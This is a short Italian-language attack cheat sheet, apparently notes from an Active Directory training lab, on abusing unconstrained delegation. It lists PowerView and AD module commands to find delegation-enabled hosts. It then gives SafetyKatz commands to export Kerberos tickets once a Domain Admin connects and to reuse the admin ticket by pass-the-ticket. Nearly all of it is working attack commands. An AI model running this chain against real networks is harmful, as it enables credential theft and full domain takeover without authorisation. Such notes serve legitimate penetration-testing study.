# Priv Esc - Unconstrained Delegation - Abusing

#### Enumerare i domain host che hanno unconstrained delegation

* PowerView

```powershell
Get-DomainComputer -UnConstrained
```

* Active Directory Module

```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

```powershell
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

#### Dopo aver compromesso il server dove l'Unconstrained Delegation e' dobbiamo attendere o trickare il domain admin a connettersi al servizio sul server

* Eseguendo il seguente comando a seguito dell'accesso di un Domain Admin sul server in questione possiamo recuperare il token da DA

```powershell
SafetyKatz.exe "sekurlsa::tickets /export"
```

#### Ticket re-use via tecninca ptt

* Utilizzando di nuovo SafetyKatz.exe con il seguente comando e' possibile utilizzare il token da Domain Admin

```powershell
Safetykatz.exe "kerberos::ptt 
C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-
DOLLARCORP.MONEYCORP.LOCAL.kirbi
```
